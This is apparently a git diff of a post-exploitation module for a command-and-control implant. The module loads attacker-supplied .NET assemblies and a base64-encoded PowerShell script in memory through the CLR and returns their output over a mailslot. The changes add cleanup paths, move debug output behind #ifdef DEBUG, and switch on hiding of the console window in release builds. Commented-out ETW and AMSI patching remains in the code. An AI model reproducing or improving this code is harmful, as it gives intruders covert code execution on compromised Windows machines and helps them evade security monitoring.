@@ -376,6 +376,9 @@ BOOL     Found   = FALSE;
 BadgerDispatch(gdispatch, "Exception Address: %p\n", Exception->ExceptionRecord->ExceptionAddress );
 BadgerDispatch(gdispatch, "Exception Code   : %p\n", Exception->ExceptionRecord->ExceptionCode );
 
+if(gEngine == NULL){
+    return EXCEPTION_CONTINUE_SEARCH;
+}
 BpEntry = gEngine->Breakpoints;
 
 if ( Exception->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP )
@@ -623,13 +626,39 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     BadgerDispatch(gdispatch,"Entered\n");
     char* appDomain = "asmranddomain";
     char* assemblyArguments = NULL;
-    char* pipeName = "asmrandpipe";
     char* slotName = "mysecondslot";
-    BOOL mailSlot = 0;
     ULONG entryPoint = 1;
-    SIZE_T totAssemblyArgsSize = 0;
     SIZE_T toEncodeSize = 0;
     char* toEncode = NULL;
+    HRESULT hr = 0;
+    ICLRMetaHost* pClrMetaHost = NULL;//done
+    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
+    ICorRuntimeHost* pICorRuntimeHost = NULL;
+    IUnknown* pAppDomainThunk = NULL;
+    AppDomain* pAppDomain = NULL;
+    Assembly* pAssembly = NULL;
+    MethodInfo* pMethodInfo = NULL;
+    VARIANT vtPsa = { 0 };
+    SAFEARRAYBOUND rgsabound[1] = { 0 };
+    wchar_t* wAssemblyArguments = NULL;
+    wchar_t* wAppDomain = NULL;
+    wchar_t* wNetVersion = NULL;
+    HWND wnd = NULL;
+    LPWSTR* argumentsArray = NULL;
+    int argumentCount = 0;
+    HANDLE stdOutput;
+    char* slotPath = NULL;
+    HANDLE stdError;
+    HANDLE mainHandle = INVALID_HANDLE_VALUE;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    size_t wideSize = 0;
+    size_t wideSize2 = 0;
+    BOOL success = 1;
+    size_t size = 65535;
+    char* returnData = (char*)MSVCRT$malloc(size);
+    MSVCRT$memset(returnData, 0, size);
+    VARIANT retVal = {0};
+    VARIANT obj = {0};
     //Extract data sent
     if(argc < 2){
         BadgerDispatch(gdispatch,"[-] Necessary at least 2 args. Assembly and powershell script\n");
@@ -640,25 +669,29 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     char* assemblyBytes = argv[0];
     char* ps_script = argv[1];
     SIZE_T base64_size = 0;
-    BadgerDispatch(gdispatch,"%s\n",ps_script);
+    //BadgerDispatch(gdispatch,"%s\n",ps_script);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Size of assembly: %d\n[*] Size of powershell script %d\n",assemblyBytesLen,psScriptLen);
     BadgerDispatch(gdispatch,"assemblyBytes = 0x%p, argv[0] = 0x%p\n",assemblyBytes,argv[0]);
-    for(int i=0;i<100;i++){
-        BadgerDispatch(gdispatch,"argv[0][%d] = %d\n",i,argv[0][i]);
-    }
-    for(int i=0;i<100;i++){
-        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,argv[0][i]);
-    }
+#endif
+    //    for(int i=0;i<100;i++){
+//        BadgerDispatch(gdispatch,"argv[0][%d] = %d\n",i,argv[0][i]);
+//    }
+//    for(int i=0;i<100;i++){
+//        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,argv[0][i]);
+//    }
 
     toEncodeSize += psScriptLen;
     if(argc > 2){
         for(int i=2;i<argc;i++){
+#ifdef DEBUG
             BadgerDispatch(gdispatch,"argv[i] = %s\n",argv[i]);
             BadgerDispatch(gdispatch,"argv[i] size = %d\n", BadgerStrlen(argv[i]));
+#endif
             toEncodeSize += BadgerStrlen(argv[i])+1;
         }
     }
-    BadgerDispatch(gdispatch,"[*] toEncodeSize = %d\n",toEncodeSize);
+    //BadgerDispatch(gdispatch,"[*] toEncodeSize = %d\n",toEncodeSize);
     toEncode = MSVCRT$malloc(toEncodeSize+0x10);
     if(toEncode == NULL){
         BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed for allocating toEncode\n");
@@ -674,99 +707,59 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     }
     MSVCRT$strcat(toEncode,"\r\n");
 
-    for(int i=0;i<100;i++){
-        BadgerDispatch(gdispatch,"toEncode[%d] = %d\n",i,toEncode[i]);
-    }
+//    for(int i=0;i<100;i++){
+//        BadgerDispatch(gdispatch,"toEncode[%d] = %d\n",i,toEncode[i]);
+//    }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"toencode size = %d\n",BadgerStrlen(toEncode));
-    BadgerDispatch(gdispatch,"toencode size = %d\n",BadgerStrlen(toEncode));
-
-    BadgerDispatch(gdispatch,"%s\n",toEncode);
+#endif
+    //BadgerDispatch(gdispatch,"%s\n",toEncode);
     CRYPT32$CryptBinaryToStringA(toEncode, BadgerStrlen(toEncode),0x1 | 0x40000000,NULL,&base64_size);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"base64_size = %d\n",base64_size);
-
+#endif
     PBYTE ps_script_b64 = MSVCRT$malloc(base64_size+0x10);
     if(ps_script_b64 == NULL){
         BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed allocate ps_script_b64\n");
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] ps_script_b64 = 0x%p\n",ps_script_b64);
+#endif
     BadgerMemset(ps_script_b64,0x0,base64_size+0x10);
 
     if(!CRYPT32$CryptBinaryToStringA(toEncode, BadgerStrlen(toEncode),0x1 | 0x40000000,ps_script_b64,&base64_size)){
         BadgerDispatch(gdispatch,"[-] CryptBinaryToStringA failed with error: %d\n",KERNEL32$GetLastError());
-        MSVCRT$free(toEncode);
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] CryptBinaryToStringA returned successfully\n");
+#endif
     MSVCRT$free(toEncode);
+    toEncode = NULL;
     assemblyArguments = MSVCRT$malloc(base64_size+0x20);
     if(assemblyArguments == NULL){
         BadgerDispatch(gdispatch,"[-] MSVCRT$malloc failed for allocating assemblyArguments\n");
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] assemblyArguments = 0x%p\n",assemblyArguments);
+#endif
     BadgerMemset(assemblyArguments,0,base64_size+0x20);
     BadgerMemcpy(assemblyArguments,ps_script_b64,base64_size);
     MSVCRT$free(ps_script_b64);
-
+    ps_script_b64 = NULL;
 
     //Create slot and pipe names
-    SIZE_T pipeNameLen = MSVCRT$strlen(pipeName);
-    char* pipePath = MSVCRT$malloc(pipeNameLen + 10);
-    MSVCRT$memset(pipePath, 0, pipeNameLen + 10);
-    MSVCRT$memcpy(pipePath, "\\\\.\\pipe\\", 9 );
-    MSVCRT$memcpy(pipePath+9, pipeName, pipeNameLen+1 );
-
     SIZE_T slotNameLen = MSVCRT$strlen(slotName);
-    char* slotPath = MSVCRT$malloc(slotNameLen + 14);
+    slotPath = MSVCRT$malloc(slotNameLen + 14);
     MSVCRT$memset(slotPath, 0, slotNameLen + 14);
     MSVCRT$memcpy(slotPath, "\\\\.\\mailslot\\", 13 );
     MSVCRT$memcpy(slotPath+13, slotName, slotNameLen+1 );
 
-    //Declare other variables
-    HRESULT hr = 0;
-    ICLRMetaHost* pClrMetaHost = NULL;//done
-    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;//done
-    ICorRuntimeHost* pICorRuntimeHost = NULL;
-    IUnknown* pAppDomainThunk = NULL;
-    AppDomain* pAppDomain = NULL;
-    Assembly* pAssembly = NULL;
-    MethodInfo* pMethodInfo = NULL;
-    VARIANT vtPsa = { 0 };
-    SAFEARRAYBOUND rgsabound[1] = { 0 };
-    wchar_t* wAssemblyArguments = NULL;
-    wchar_t* wAppDomain = NULL;
-    wchar_t* wNetVersion = NULL;
-    LPWSTR* argumentsArray = NULL;
-    int argumentCount = 0;
-    HANDLE stdOutput;
-    HANDLE stdError;
-    HANDLE mainHandle;
-    HANDLE hFile;
-    size_t wideSize = 0;
-    size_t wideSize2 = 0;
-    BOOL success = 1;
-    size_t size = 65535;
-    char* returnData = (char*)MSVCRT$malloc(size);
-    MSVCRT$memset(returnData, 0, size);
-
-    /*Debug Only
-    BadgerDispatch(gdispatch, "[+] appdomain = %s\n", appDomain);//Debug Only
-    BadgerDispatch(gdispatch, "[+] amsi = %d\n", amsi);//Debug Only
-    BadgerDispatch(gdispatch, "[+] etw = %d\n", etw);//Debug Only
-    BadgerDispatch(gdispatch, "[+] revertETW = %d\n", revertETW);//Debug Only
-    BadgerDispatch(gdispatch, "[+] mailSlot = %d\n", mailSlot);//Debug Only
-    BadgerDispatch(gdispatch, "[+] entryPoint = %d\n", entryPoint);//Debug Only
-    BadgerDispatch(gdispatch, "[+] mailSlot name = %s\n", slotName);//Debug Only
-    BadgerDispatch(gdispatch, "[+] Pipe name = %s\n", pipeName);//Debug Only
-    BadgerDispatch(gdispatch, "[+] pipePath name = %s\n", pipePath);//Debug Only
-    BadgerDispatch(gdispatch, "[+] mailslot Path name = %s\n", slotPath);//Debug Only
-    BadgerDispatch(gdispatch, "[+] assemblyArguments = %s\n", assemblyArguments);//Debug Only
-    BadgerDispatch(gdispatch, "[+] assemblyByteLen = %d\n", assemblyByteLen);//Debug Only
-    */
-    for(int i=0;i<100;i++){
-        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,assemblyBytes[i]);
-    }
+//    for(int i=0;i<100;i++){
+//        BadgerDispatch(gdispatch,"assemblyBytes[%d] = %d\n",i,assemblyBytes[i]);
+//    }
     BadgerDispatch(gdispatch,"assemlyBytesLen = %d\n",assemblyBytesLen);
     //Determine .NET assemblie version
     if(FindVersion((void*)assemblyBytes, assemblyBytesLen))
@@ -815,17 +808,6 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         //Insert the string from argumentsArray[i] into the safearray
         OLEAUT32$SafeArrayPutElement(vtPsa.parray, &i, OLEAUT32$SysAllocString(argumentsArray[i]));
     }
-//    //Break ETW
-//    if (etw != 0 || revertETW != 0) {
-//        success = patchETW(0);
-//
-//        if (success != 1) {
-//
-//            //If patching ETW fails exit gracefully
-//            BadgerDispatch(gdispatch , "Patching ETW failed.  Try running without patching ETW");
-//            return;
-//        }
-//    }
 
     //Start CLR
     success = StartCLR((LPCWSTR)wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost);
@@ -833,7 +815,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     //If starting CLR fails exit gracefully
     if (success != 1) {
         //MSVCRT$free(assemblyArguments);
-        return;
+        goto CLEANUP;
     }
     else{
         BadgerDispatch(gdispatch,"[*] CLR started successfully\n");
@@ -845,14 +827,17 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
 
     if(!success){
         BadgerDispatch(gdispatch,"[-] issue with creating slot\n");
-        return;
+        goto CLEANUP;
     }
     BadgerDispatch(gdispatch,"[*] mainHandle = 0x%p\n",mainHandle);
     hFile = KERNEL32$CreateFileA(slotPath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES)NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
     if(hFile == INVALID_HANDLE_VALUE){
         BadgerDispatch(gdispatch,"[-] CreateFile to slotpath failed with error = %d\n",KERNEL32$GetLastError());
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] hFile = 0x%p\n",hFile);
+#endif
     //Attach or create console
     BOOL frConsole = 0;
     BOOL attConsole = 0;
@@ -864,13 +849,17 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         //_AllocConsole AllocConsole = (_AllocConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "AllocConsole");
         //_GetConsoleWindow GetConsoleWindow = (_GetConsoleWindow) GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetConsoleWindow");
         if(KERNEL32$AllocConsole())
+#ifdef DEBUG
             BadgerDispatch(gdispatch,"[*] Created Console\n");
+#endif
         //Hide Console Window
         //HINSTANCE hinst = LoadLibrary("user32.dll");
         //_ShowWindow ShowWindow = (_ShowWindow)GetProcAddress(hinst, "ShowWindow");
-        HWND wnd = KERNEL32$GetConsoleWindow();
-        //if (wnd)
-            //USER32$ShowWindow(wnd, SW_HIDE);
+        wnd = KERNEL32$GetConsoleWindow();
+#ifndef DEBUG
+        if (wnd)
+            USER32$ShowWindow(wnd, SW_HIDE);
+#endif
     }
 
     //Get current stdout handle so we can revert stdout after we finish
@@ -881,25 +870,31 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     //_SetStdHandle SetStdHandle = (_SetStdHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");
     success = KERNEL32$SetStdHandle (((DWORD)-11), hFile);
     if(!success){
-        BadgerDispatch(gdispatch,"[-] failed to set stdout\n");
+        BadgerDispatch(gdispatch,"[-] failed to set stdout with error = 0x%d\n",KERNEL32$GetLastError());
+        goto CLEANUP;
     }
     success = KERNEL32$SetStdHandle (((DWORD)-12), hFile);
     if(!success){
-        BadgerDispatch(gdispatch,"[-] failed to set stderr\n");
+        BadgerDispatch(gdispatch,"[-] failed to set stderr with error = 0x%d\n",KERNEL32$GetLastError());
+        goto CLEANUP;
     }
     //Create our AppDomain
     hr = pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, (LPCWSTR)wAppDomain, NULL, &pAppDomainThunk);
     if(hr == S_OK){
         hr = pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (VOID**)&pAppDomain);
         if(hr == S_OK){
+#ifdef DEBUG
             BadgerDispatch(gdispatch,"[*] AppDomain created succesfully\n");
+#endif
         }
         else{
-            BadgerDispatch(gdispatch,"[*] QueryInterface failed. hr = %d\n",hr);
+            BadgerDispatch(gdispatch,"[-] QueryInterface failed. hr = %d\n",hr);
+            goto CLEANUP;
         }
     }
     else{
-        BadgerDispatch(gdispatch,"[*] CreateDomain failed. hr = %d\n",hr);
+        BadgerDispatch(gdispatch,"[-] CreateDomain failed. hr = %d\n",hr);
+        goto CLEANUP;
     }
     //Patch amsi
 //    if (amsi != 0) {
@@ -916,24 +911,29 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     rgsabound[0].cElements = assemblyBytesLen;
     rgsabound[0].lLbound = 0;
     SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, rgsabound);
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] pSafeArray = 0x%p\n", pSafeArray);
+#endif
     if(pSafeArray == NULL){
         BadgerDispatch(gdispatch,"[-] SafeArrayCreate failed\n");
-        return;
+        goto CLEANUP;
     }
     void* pvData = NULL;
     hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pvData);
     if(hr != S_OK || pvData == NULL){
         BadgerDispatch(gdispatch,"[-] SafeArrayAccessData failed with error = 0x%d. PvData = 0x%p\n",KERNEL32$GetLastError(),pvData);
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] pvData = 0x%p\n",pvData);
+#endif
     //Copy our assembly bytes to pvData
     MSVCRT$memcpy(pvData, assemblyBytes, assemblyBytesLen);
 
     hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);
     if(hr != S_OK){
         BadgerDispatch(gdispatch,"[-] SafeArrayUnaccessData failed with error = 0x%d\n",KERNEL32$GetLastError());
+        goto CLEANUP;
     }
     //Prep AppDomain and EntryPoint
     hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
@@ -941,20 +941,22 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         //If AppDomain fails to load fail gracefully
         BadgerDispatch(gdispatch , "[-] Process refusing to load AppDomain of %ls CLR version.  Try running an assembly that requires a differnt CLR version.\n", wNetVersion);
         //MSVCRT$free(assemblyArguments);
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Assembly loaded successfully\n");
+#endif
     hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
     if (hr != S_OK) {
         //If EntryPoint fails to load fail gracefully
         BadgerDispatch(gdispatch , "[-] Process refusing to find entry point of assembly.\n");
         //MSVCRT$free(assemblyArguments);
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Assembly entrypoint retrived. pMethodInfo = 0x%p\n",pMethodInfo);
-    VARIANT retVal;
+#endif
     MSVCRT$memset(&retVal, 0x0,sizeof(VARIANT));
-    VARIANT obj;
     MSVCRT$memset(&obj, 0x0,sizeof(VARIANT));
     obj.vt = VT_NULL;
 
@@ -969,23 +971,33 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
     hr = pMethodInfo->lpVtbl->Invoke_3(pMethodInfo, obj, psaStaticMethodArgs, &retVal);
     if(hr != S_OK){
         BadgerDispatch(gdispatch,"[-] Invoke_3 failed with error %d\n",hr);
-        return;
+        goto CLEANUP;
     }
+#ifdef DEBUG
     BadgerDispatch(gdispatch,"[*] Invoke_3 returned successfully\n");
+#endif
     //HwBpEngineDestroy(NULL);
     //Read from our mailslot
     success = ReadSlot(returnData, &mainHandle);
     //Send .NET assembly output back to CS
     if(success)
         BadgerDispatch(gdispatch, "\n\n%s\n", returnData);
-    return;
     //Close handles
     //_CloseHandle CloseHandle = (_CloseHandle) GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
-    KERNEL32$CloseHandle(mainHandle);
-
+    CLEANUP:
+    HwBpEngineDestroy(NULL);
     //Revert stdout back to original handles
     success = KERNEL32$SetStdHandle(((DWORD)-11), stdOutput);
     success = KERNEL32$SetStdHandle(((DWORD)-12), stdError);
+
+    if(hFile != INVALID_HANDLE_VALUE && hFile != NULL ){
+        KERNEL32$CloseHandle(hFile);
+        hFile = INVALID_HANDLE_VALUE;
+    }
+    if(mainHandle != INVALID_HANDLE_VALUE && mainHandle != NULL) {
+        KERNEL32$CloseHandle(mainHandle);
+        mainHandle = INVALID_HANDLE_VALUE;
+    }
     //Clean up
     OLEAUT32$SafeArrayDestroy(pSafeArray);
     OLEAUT32$VariantClear(&retVal);
@@ -994,7 +1006,6 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
 
     if (NULL != psaStaticMethodArgs) {
         OLEAUT32$SafeArrayDestroy(psaStaticMethodArgs);
-
         psaStaticMethodArgs = NULL;
     }
     if (pMethodInfo != NULL) {
@@ -1031,22 +1042,33 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {//Executes .NET assembly i
         (pClrMetaHost)->lpVtbl->Release(pClrMetaHost);
         (pClrMetaHost) = NULL;
     }
-
+    if(assemblyArguments != NULL){
+        MSVCRT$free(assemblyArguments);
+        assemblyArguments = NULL;
+    }
+    if(toEncode != NULL){
+        MSVCRT$free(toEncode);
+        toEncode = NULL;
+    }
+    if(slotPath != NULL){
+        MSVCRT$free(slotPath);
+        slotPath = NULL;
+    }
+    if(returnData != NULL){
+        MSVCRT$free(returnData);
+        returnData = NULL;
+    }
+    if(ps_script_b64 != NULL){
+        MSVCRT$free(ps_script_b64);
+        ps_script_b64 = NULL;
+    }
     //Free console only if we attached one
     if (frConsole != 0) {
         //_FreeConsole FreeConsole = (_FreeConsole) GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeConsole");
         success = KERNEL32$FreeConsole();
     }
 
-    //Revert ETW if chosen
-//    if (revertETW != 0) {
-//        success = patchETW(revertETW);
-//
-//        if (success != 1) {
-//
-//            BadgerDispatch(gdispatch , "Reverting ETW back failed");
-//        }
-//    }
-
+#ifdef DEBUG
     BadgerDispatch(gdispatch, "[+] inlineExecute-Assembly Finished\n");
+#endif
 }
